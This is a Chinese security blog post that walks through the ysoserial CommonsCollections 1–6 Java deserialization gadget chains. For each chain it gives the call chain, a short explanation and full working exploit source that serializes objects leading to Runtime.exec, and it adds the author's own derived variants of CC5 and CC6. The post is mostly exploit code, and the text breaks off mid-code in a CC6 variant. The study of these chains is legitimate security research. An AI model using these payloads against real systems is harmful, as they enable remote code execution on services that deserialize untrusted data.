> 原文链接: https://www.anquanke.com//post/id/200637 


# ysoserial-CommonsCollections系列总结篇


                                阅读量   
                                **599411**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">6</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t01378801521a7809f2.jpg)](https://p1.ssl.qhimg.com/t01378801521a7809f2.jpg)



## 前言：

网上分析CommonsCollections调用链的文章也有不少，但是看完分析文章直接手动构造利用链仍有难度，因此这篇文章主要总结本人调试ysoserial的CommonsCollections系列利用链的思考和体会，通过这篇文章希望大家能够了解CommonsCollections不同链之间的共性和区别，能够在看完gadget后可以手动构造利用链，本文主要内容包括以下几点：
- 1.每条反序列化利用链的构成特点
- 2.每条链不同类之间衔接的特点及要点
- 3.对比不同利用链之间的区别以及相似点
- 4.自己如何根据链接点的特性来构造反序列化exp
- 5.如何混合搭配链接点从而形成一条新的gadget利用链(例如cc5、cc6、cc7分别扩展2条、2条、1条)


## CommonsCollections1

反序列化调用链如下所示：

```
AnnotationInvocationHandler.readObject()
                Map(Proxy).entrySet()
                    AnnotationInvocationHandler.invoke()
                        LazyMap.get()
                            ChainedTransformer.transform()
                               ConstantTransformer.transform()
                                  InvokerTransformer.transform()
                                       Runtime.getRuntime()
                                             Runtime.exec()
```

对于cc1(以下cc即代表commonscollections)来说最外层的Annotationinvocationhandler相当于只是一个容器作用，将动态代理proxy放到其this.memberValues成员方法中去，其中invocationhandler又是一个Annotationinvocationhandler，然后在其readobject方法中就会调用this.memberValues.entryset,从而触发动态代理，从而进入动态代理的invoke函数代码块

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0116d0751952994c14.png)

因此invoke函数中调用this.memberValues.get即调用lazymap.get，从而到了this.factory.transform()，接下来内部是chainedTransformer+constantTransformer+3层invokeTransformer，因为get的参数是不存在的entryset，所以需要constantTransformer先返回一个Runtime类再通过3个invokeTransformer联合起来反射rce执行命令。<br>**CommonsCollections1.java：**

```
package CommonsCollections1;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import java.io.*;
import java.lang.Runtime;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.map.LazyMap;
import java.lang.reflect.Proxy;
import java.lang.reflect.InvocationHandler;
public class exp `{`
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException `{`
      final Transformer[] trans = new Transformer[]`{`
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]`{`String.class,Class[].class`}`,
                        new Object[]`{`"getRuntime",new Class[0]`}`
                        ),//拿到Method getruntime方法
                new InvokerTransformer("invoke",
                        new Class[]`{`Object.class,Object[].class`}`,
                        new Object[]`{`null,new Object[0]`}`),//拿到Runtime类实例
                new InvokerTransformer("exec",
                        new Class[]`{`String.class`}`,
                        new String[]`{`"calc.exe"`}`)//调用exec执行命令
      `}`;
      final Transformer chained = new ChainedTransformer(trans); //封装chained调用链
      final Map innerMap = new HashMap();
      final Map outMap = LazyMap.decorate(innerMap,chained); //封装lazymap
      final Constructor&lt;?&gt; han_con = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
      han_con.setAccessible(true);
      InvocationHandler han = (InvocationHandler) han_con.newInstance(Override.class,outMap); //将lazymap放进membervalues，从而在membervalues.get变为laymap.get 
      final Map mapProxy = (Map)Proxy.newProxyInstance(exp.class.getClassLoader(),outMap.getClass().getInterfaces(),han);  //为lazymap设置动态代理，从而到达handler的invoke
      //将proxy代理放进外层的AnnotationInvocationHandler，从而membervalues.entryset触发动态代理
      final Constructor&lt;?&gt; out_con = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
      out_con.setAccessible(true);
      InvocationHandler out =(InvocationHandler) out_con.newInstance(Override.class,mapProxy); 
      FileOutputStream fo = new FileOutputStream(new File(System.getProperty("user.dir")+"/javasec-ysoserial/src/main/resources/commoncollections1.ser"));
      ObjectOutputStream obj = new ObjectOutputStream(fo);
      obj.writeObject(out);
      obj.close();
    `}`
`}`
```



## CommonsCollections2

反序列化调用链如下所示：

```
PriorityQueue.readObject()
                PriorityQueue.heapify()
                    PriorityQueue.siftDown()
                        PriorityQueue.siftDownUsingConparator()
                            TransformingComparator.compare()
                                InvokerTransformer.transform()
　　　　　　　　　　　　　　　　　　TemplatesImpl.newTranformer()
　　　　　　　　　　　　　　　　　　　　Method.invoke()
                               　　　　  Runtime.exec()
```

cc2的利用PriorityQueue队列键值反序列化后进行key值比较，可以自定义比较器comparator，因此利用commonscollections4里面的TransformingComparator，在该类的compare函数中又会调用this.transformer.transform来对key进行转换，因为key是从外面直接传进来的，即可控的，这里key其实是一个templatesimpl的实例。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01eef47f84a43f6232.png)

在打fastjson1.2.24中就用到了jdk的templatesimpl这个内置类，在其_bytecodes字段中放入恶意类的字节码，将在调用其getTransletInstance中进行实例化，所以这里只需要一个invoketransformer即可，直接反射执行调用templatesImpl的newTransformer或者getoutputProperties来实例化templates的_bytecodes字段中的类进行rce<br>**CommonsCollections2.java：**

```
package CommonCollections2;
import javassist.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;
import  com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
public class exp `{`
    public static void main(String[] args) throws ClassNotFoundException, NotFoundException, IOException, CannotCompileException, NoSuchFieldException, IllegalAccessException `{`
        //封装恶意的templatesImpl实例
        TemplatesImpl tmp = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(payload.class));
        CtClass clazz = pool.get(payload.class.getName());
        final byte[] clazzByte = clazz.toBytecode();
        //_bytecode为private，需要在其中放入rce的payload类的字节码
        Field _btcode = TemplatesImpl.class.getDeclaredField("_bytecodes");
        _btcode.setAccessible(true);
        _btcode.set(tmp,new byte[][]`{`clazzByte`}`);
        //_name不为空即可
        Field _name = TemplatesImpl.class.getDeclaredField("_name");
        _name.setAccessible(true);
        _name.set(tmp,"tr1ple");
        //_tfactory可为空，不设置也可以
        Field _tf = TemplatesImpl.class.getDeclaredField("_tfactory");
        _tf.setAccessible(true);
        _tf.set(tmp,null);
        //构造priorityqueue实例
        PriorityQueue queue = new PriorityQueue(2);
        queue.add(1);
        queue.add(1);
        InvokerTransformer trans = new InvokerTransformer("newTransformer",new Class[0],new Object[0]);
        //InvokerTransformer trans = new InvokerTransformer("getOutputProperties",new Class[0],new Object[0]); //调用该方法一样的效果
        //依赖collections4
        TransformingComparator com = new TransformingComparator(trans);
        //自定义comparator
        Field ComFi = PriorityQueue.class.getDeclaredField("comparator");
        ComFi.setAccessible(true);
        ComFi.set(queue,com);
        Field qu = PriorityQueue.class.getDeclaredField("queue");
        qu.setAccessible(true);
        Object[] objOutput = (Object[])qu.get(queue);
        objOutput[0] = tmp; //将templasImpl实例放入队列，从而进一步传入invokertransform的transform函数
        objOutput[1] = 1;
        //序列化
        File file;
        file = new File(System.getProperty("user.dir")+"/javasec-ysoserial/src/main/resources/commoncollections2.ser");
        OutputStream out = new FileOutputStream(file);
        ObjectOutputStream obj = new ObjectOutputStream(out);
        obj.writeObject(queue);
        obj.close();
    `}`
`}`
```

payload.java

```
package CommonCollections3;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;
public class payload extends AbstractTranslet `{`
　　//将命令写在static代码块或者构造函数中都可以
    `{`
        try `{`
            Runtime.getRuntime().exec("calc.exe");
        `}` catch (IOException e) `{`
            e.printStackTrace();
        `}`
    `}`
    public payload()`{`
        System.out.println("tr1ple 2333");
    `}`
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException `{`
    `}`
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException `{`
    `}`
`}`
```



## CommonsCollections3

反序列化调用链如下所示：

```
AnnotationInvocationHandler.readObject()
        Proxy(LazyMap).extrySet()
             LazyMap.get()
               ChainedTransformer.transform()
                 constantTransformer(TrAXFilter.class)　
                   InstantiateTransformer.transform()
                     Constructor.newInstance()
                       TemplatesImpl.newTransformer()
                          (payload实例化)rce-&gt;calc.exe
```

cc3从外层和cc1一样都是从AnnotationInvocationHandler的readObject进入，不同点是内部引入了新的InstantiateTransformer类，该类的transformer有个特点即可以通过newInstance方法实例化入口的key

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01782f11608fd96ce0.png)

那么因为AnnotationInvocationHandler+lazymap.get不存在的key导致key不可控，因此只需要chainedTransformer第一个transfomer为constanttransformer即可，这里用到了类com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter，该类有个特点即如下图所示其构造函数中调用了templates.newTransformer()函数。<br>**CommonsCollections3.java:**

```
package CommonCollections3;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.functors.InstantiateTransformer;
import  com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.map.LazyMap;
import javax.xml.transform.Templates;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;
//@Dependencies(`{`"commons-collections:commons-collections:3.1"`}`)
public class exp `{`
    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException, NotFoundException, IOException, CannotCompileException `{`
        //构造TemplatesImpl实例 
        TemplatesImpl tmp = new TemplatesImpl();
        //封装TemplatesImpl实例
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(payload.class));
        CtClass pay = pool.get(payload.class.getName());
        byte[] PayCode = pay.toBytecode();
        Class clazz;
        clazz  = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Field tf = clazz.getDeclaredField("_bytecodes");
        tf.setAccessible(true);
        tf.set(tmp,new byte[][]`{`PayCode`}`);
        Field name = clazz.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(tmp,"tr1ple");
        HashMap InnerMap = new HashMap();
        Transformer[] trans = new Transformer[]`{`
         new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]`{`Templates.class`}`,
                        new Object[]`{`tmp`}`  //将TemplasImpl的实例放进参数值位置，从而调用newInstance实例化传入
                        )
        `}`;
        //封装chained和lazymap
        ChainedTransformer chined = new ChainedTransformer(trans);
        Map outmap = LazyMap.decorate(InnerMap,chined);
        //接下来的构造与commonscollection1相同
        final Constructor con = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        con.setAccessible(true);
        InvocationHandler han = (InvocationHandler)con.newInstance(Override.class,outmap);
        Map proxy = (Map) Proxy.newProxyInstance(exp.class.getClassLoader(),outmap.getClass().getInterfaces(),han);
        final Constructor out_con = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        out_con.setAccessible(true);
        InvocationHandler out_han = (InvocationHandler) out_con.newInstance(Override.class,proxy);
        //序列化
        File file;
        file = new File(System.getProperty("user.dir")+"/javasec-ysoserial/src/main/resources/commoncollections3.ser");
        FileOutputStream fo = new FileOutputStream(file);
        ObjectOutputStream ObjOut = new ObjectOutputStream(fo);
        ObjOut.writeObject(out_han);
    `}`
`}`
```



## CommonsCollections4

反序列化调用链如下所示：

```
PriorityQueue.readObject()
     PriorityQueue.heapify()
        PriorityQueue.siftDown()
              PriorityQueue.siftDownUsingConparator()
　　　　　　　　　　　ChainedTransformer.transform()
　　　　　　　　　　　　　　InstantiateTransformer.transform()
                             (TrAXFilter)Constructor.newInstance()
　　　　　　　　　　　　　　　　　　　　templatesImpl.newTranformer() 
  　　　　　　　　　　　　　　　　　　　　　　Method.invoke() 　　　　     
                                            Runtime.exec()
```

因为cc3引入了InstantiateTransformer类来对cc1做了个变形，那么同理，该类对于cc2也能做同样的变型来形成一条新的链，所以cc4相对于cc2来说并没有将templatesImpl类的实例直接放入队列，而是和cc3一样，利用chained转换链+一个constantTranformer返回TrAXFilter类

[![](https://p1.ssl.qhimg.com/t012025764d9cb6289a.png)](https://p1.ssl.qhimg.com/t012025764d9cb6289a.png)

从而第二次transform的时候即调用该类的newInstance实例化，而实例化的参数因为也是可控的，因此在参数位置放入templateImpl实例<br>**CommonsCollections4.java**

```
package CommonsCollections4;
import  com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.ComparableComparator;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import javax.xml.transform.Templates;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
public class exp `{`
    public static void main(String[] args) throws IOException, CannotCompileException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NotFoundException `{`
        //封装templasImpl实例
        TemplatesImpl tmp = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(payload.class));
        CtClass pay_class = pool.get(payload.class.getName());
        byte[] payCode = pay_class.toBytecode();
        Class clazz;
        clazz =Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        //存储payload字节码
        Field byteCode = clazz.getDeclaredField("_bytecodes");
        byteCode.setAccessible(true);
        byteCode.set(tmp,new byte[][]`{`payCode`}`);
        Field name  = clazz.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(tmp,"tr1ple");
        Transformer[] trans = new Transformer[]`{`
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]`{`Templates.class`}`,
                        new Object[]`{`tmp`}`) //将TemplatesImpl实例放进参数值位置，与cc3原理一样，便于在构造函数中触发newTransformer
        `}`;
        //封装chained转换链
        ChainedTransformer chian = new ChainedTransformer(trans);
        TransformingComparator transCom = new TransformingComparator(chian);
        //封装外层的队列
        PriorityQueue queue = new PriorityQueue(2);
        queue.add(1);
        queue.add(1);
        Field com = PriorityQueue.class.getDeclaredField("comparator");
        com.setAccessible(true);
        com.set(queue,transCom);
        //序列化
        File file;
        file = new File(System.getProperty("user.dir")+"/javasec-ysoserial/src/main/resources/commonscollections4.ser");
        ObjectOutputStream obj_out = new ObjectOutputStream(new FileOutputStream(file));
        obj_out.writeObject(queue);
    `}`
`}`
```



## CommonsCollections5

反序列化调用链如下所示：

```
BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            　　InvokerTransformer.transform()
                                    Runtime.exec()
```

cc5这条链相对于前四条来说外部的入口点变了，但是内部还是没变，依然是通过lazymap.get，那么后面就可以跟cc1的调用一样，直接通过1层constantTransformer和3层invokerTransformer结合来rce，那么相当于外面的衣服换了，里面的衣服没换

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0160b0d5915c6ccd71.png)

`Commonscollections5衍生1`：想想cc3的构造，对于cc1而言，和cc5相比正好相反，所以将cc3的链接点放到cc5，从而就可以衍生出第一条新的利用链<br>`Commonscollections5衍生2`：因为TiedMapEntry键对应的值是可控的，因此第一次传入this.factory.transform的key也是可控的，因此根据cc2的特点，直接在外部放入templatesImpl类的实例，然后结合invokeTransformer调用该类的newTransformer或者getoutputProperties又衍生出第二条新的利用链<br>**CommonsCollections5.java(原版exp):**

```
package CommonsCollections5;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;
public class exp `{`
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException `{`
        //构造内部的constant+invoke转换链
        Transformer[] trans = new Transformer[]`{`
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]`{`String.class,Class[].class`}`,
                        new Object[]`{`"getRuntime",new Class[0]`}`),
                new InvokerTransformer("invoke",
                        new Class[]`{`Object.class,Object[].class`}`,
                        new Object[]`{`null,null`}`),
                new InvokerTransformer("exec",
                        new Class[]`{`String.class`}`,
                        new Object[]`{`"calc.exe"`}`)
        `}`;
        //封装chained转换链
        ChainedTransformer chian = new ChainedTransformer(trans);
        //封装lazymap
        HashMap map = new HashMap();
        Map innerMap = LazyMap.decorate(map,chian);
        //构造外部的触发链触发varobj.tostring到达lazymap.get
        TiedMapEntry entry = new TiedMapEntry(innerMap, "tr1ple");
        BadAttributeValueExpException val  = new BadAttributeValueExpException(null);
        Field valField = val.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(val,entry); //将TiedMapEntry实例放进val属性，从而在反序列化还原后最终调用this.map.get
        //序列化
        File file;
        file =new File(System.getProperty("user.dir")+"/javasec-ysoserial/src/main/resources/commonscollections5.ser");
        ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(file));
        obj.writeObject(val);
    `}`
`}`
```

**CommonsCollections5-1.java:（根据cc1特点生成的衍生版1）**

```
package CommonsCollections5;
import CommonsCollections4.payload;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;
public class exp1 `{`
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, NotFoundException, CannotCompileException, ClassNotFoundException `{`
        //封装TemplatesImpl实例
        TemplatesImpl tmp = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(payload.class));
        CtClass pay_class = pool.get(payload.class.getName());
        byte[] payCode = pay_class.toBytecode();
        Class clazz;
        clazz =Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        //存储payload类
        Field byteCode = clazz.getDeclaredField("_bytecodes");
        byteCode.setAccessible(true);
        byteCode.set(tmp,new byte[][]`{`payCode`}`);
        Field name  = clazz.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(tmp,"tr1ple");
        //构造内部的转换链，与原版cc5不同的是此时constanTransformer返回不再是Runtime.class
        Transformer[] trans = new Transformer[]`{`
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]`{`Templates.class`}`,
                        new Object[]`{`tmp`}`
                )
        `}`;
        //封装chained转换链
        ChainedTransformer chian = new ChainedTransformer(trans);
        HashMap map = new HashMap();
        Map innerMap = LazyMap.decorate(map,chian);
        //构造外部的触发点
        TiedMapEntry entry = new TiedMapEntry(innerMap, "tr1ple");
        BadAttributeValueExpException val  = new BadAttributeValueExpException(null);
        Field valField = val.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(val,entry);
        //序列化
        File file;
        file =new File(System.getProperty("user.dir")+"/javasec-ysoserial/src/main/resources/commonscollections5.ser");
        ObjectOutputStream obj = new ObjectOutputStream(new     FileOutputStream(file));
        obj.writeObject(val);
    `}`
`}`
```

**CommonsCollections5-2.java：（根据cc2特点生成的衍生版2）**

```
package CommonsCollections5;
import CommonsCollections4.payload;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.functors.InvokerTransformer;
import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;
public class exp2 `{`
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, CannotCompileException, NotFoundException `{`
        //封装Templates实例
        TemplatesImpl tmp = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(payload.class));
        CtClass pay_class = pool.get(payload.class.getName());
        byte[] payCode = pay_class.toBytecode();
        Class clazz;
        clazz =Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        //存储payload字节码
        Field byteCode = clazz.getDeclaredField("_bytecodes");
        byteCode.setAccessible(true);
        byteCode.set(tmp,new byte[][]`{`payCode`}`);
        Field name  = clazz.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(tmp,"tr1ple");
        //只需要一次invoke反射调用即可
        InvokerTransformer trans = new InvokerTransformer("newTransformer",new Class[0],new Object[0]);

        HashMap map = new HashMap();
        Map innerMap = LazyMap.decorate(map,trans);
        //构造外部的触发链,将构造的TemplateImpl实例放入
        TiedMapEntry entry = new TiedMapEntry(innerMap, tmp);
        BadAttributeValueExpException val  = new BadAttributeValueExpException(null);
        Field valField = val.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(val,entry);
        //序列化
        File file;
        file =new File(System.getProperty("user.dir")+"/javasec-ysoserial/src/main/resources/commonscollections5-2.ser");
        ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(file));
        obj.writeObject(val);
    `}`
`}`
```



## CommonsCollections6

反序列化调用链如下所示：

```
java.util.HashSet.readObject()
                java.util.HashMap.put()
                  java.util.HashMap.hash()
                    TiedMapEntry.hashCode()
                   　　 TiedMapEntry.getValue()
                      　　  LazyMap.get()
                                ChainedTransformer.transform()
                           　　　　InvokerTransformer.transform()
                                       Runtime.exec()
```

cc6外部也是采用了新的hashset来触发其readObject()，而hashset对象的插入是根据它的hashcode，并且hashset内用HashMap对它的内部对象进行排序，那么反序列化后恢复元素的过程中，将再次计算key的hashcode，而TiedMapEntry有趣的一点是它的hashCode函数中将调用该类的getvalue函数，而我们在分析完cc5之后知道getvalue函数中将调用this.map.get(this.key)，所以此时后半部调用链和cc5又是一模一样了，接着就是lazymap.get干的事，cc6中用的是也是一层contantTransform+3层invokeTranform。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01ebff15664f89bdb2.png)

`Commonscollections6衍生1:`因为这里key值也是可控的，因此cc6同时也可以进行换装了，即根据cc3的特点结合一层ConstantTransformer+一层invokertransformer，利用链的上半部分不变，只变下半部分的chained即可生成第一条衍生版的cc6<br>`Commonscollections6衍生2:`第二种显然与cc5的衍生也是一样的，因为最终进入第一层transformer的key可控，因此根据cc2的特点结合一层invokeTransformer反射即可形成cc6的第二条衍生链<br>**CommonsCollections6.java(原版exp):**

```
package CommonsCollections6;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.lang.reflect.Method;
import java.lang.Class;
import java.lang.Runtime;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
public class exp `{`
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException, IOException `{`
        //构造内部转换链
        Transformer[] trans = new Transformer[]`{`
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]`{`String.class,Class[].class`}`,
                        new Object[]`{`"getRuntime",new Class[0]`}`),
                new InvokerTransformer("invoke",
                        new Class[]`{`Object.class,Object[].class`}`,
                        new Object[]`{`null,null`}`),
                new InvokerTransformer("exec",
                        new Class[]`{`String.class`}`,new Object[]`{`"calc.exe"`}`
                        )
        `}`;
        ChainedTransformer chain = new ChainedTransformer(trans);
        HashMap innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "tr1ple2333");
        innerMap.clear();
        //构造外部入口链
        HashSet newSet = new HashSet(1);
        newSet.add("tr1ple");
        Field innerSetMap  = HashSet.class.getDeclaredField("map");
        innerSetMap.setAccessible(true);
        //修改hashset内部的hashmap存储
        HashMap setMap = (HashMap)innerSetMap.get(newSet);
        Field table = HashMap.class.getDeclaredField("table");
        table.setAccessible(true);
        //拿到存储的数据
        Object[] obj = (Object[])table.get(setMap);
        Object node  = obj[0];
        System.out.println(node.getClass().getName());
        Method[] methods  = node.getClass().getMethods();
        for(int i=0;i&lt;methods.length;i++)`{`
            System.out.println(methods[i].getName());
        `}`
        //拿到此时存到hashset中的node节点，key为要修改的点，这里需要修改它为真正的payload，即Tiedmapentry
        System.out.println(node.toString());
        Field key = node.getClass().getDeclaredField("key");
        key.setAccessible(true);
        key.set(node,entry);
        //hashset的hashmap中的node节点修改完值以后放进hashset
        Field finalMap = newSet.getClass().getDeclaredField("map");
        finalMap.setAccessible(true);
        finalMap.set(newSet,setMap);
        //序列化
        File file;
        file = new File(System.getProperty("user.dir")+"/javasec-ysoserial/src/main/resources/commonscollections6.ser");
        ObjectOutputStream objOut = new ObjectOutputStream(new FileOutputStream(file));
        objOut.writeObject(newSet);
    `}`
`}`
```

**CommonsCollections6-1(根据cc3特点生成的衍生版1).java**

```
package CommonsCollections6;
import CommonsCollections4.payload;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import javax.xml.transform.Templates;
import java.lang.reflect.Method;
import java.lang.Class;
import java.lang.Runtime;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
public class exp1 `{`
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException, IOException, NotFoundException, CannotCompileException `{`
        //封装templatesImpl实例
        TemplatesImpl tmp = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(payload.class));
        CtClass pay_class = pool.get(payload.class.getName());
        byte[] payCode = pay_class.toBytecode();
        Class clazz;
